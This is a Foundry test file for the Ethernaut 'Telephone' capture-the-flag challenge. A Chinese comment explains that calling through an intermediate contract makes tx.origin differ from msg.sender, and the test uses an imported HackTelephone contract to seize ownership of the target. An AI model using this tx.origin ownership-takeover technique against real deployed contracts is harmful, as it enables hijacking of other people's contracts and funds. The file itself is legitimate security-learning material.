pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Telephone.sol";
import "../src/HackTelephone.sol";


/** 
 * 解题思路：关键在于 tx.origin 和 msg.sender 的区别，通过中间合约调用的 Telephone 合约，那么 tx.origin 和 msg.sender 就会不一样
 */ 
contract TelephoneTest is Test {
    address hacker = address(1111111111111111111111111111111);
    Telephone t1;
    HackTelephone h1;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        t1 = new Telephone();
        h1 = new HackTelephone();
    }
    function testHackTelephone() public {
        vm.startPrank(hacker);
        console.log("hacker address:");
        console.logAddress(hacker);
        h1.hackOwner(address(t1));
        console.log("telephone owner:");
        console.logAddress(t1.owner());
        vm.stopPrank();
    }
}